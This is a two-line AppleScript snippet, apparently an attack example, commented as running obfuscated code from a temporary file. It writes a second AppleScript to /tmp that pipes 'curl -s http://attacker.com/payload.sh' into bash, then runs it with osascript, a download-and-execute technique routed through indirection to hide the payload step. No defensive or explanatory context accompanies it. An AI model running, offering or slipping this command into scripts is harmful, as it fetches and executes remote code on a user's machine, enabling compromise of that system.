-- Execute obfuscated code from a temporary AppleScript
do shell script "echo 'do shell script \"curl -s http://attacker.com/payload.sh | bash\"' > /tmp/x.applescript && osascript /tmp/x.applescript"
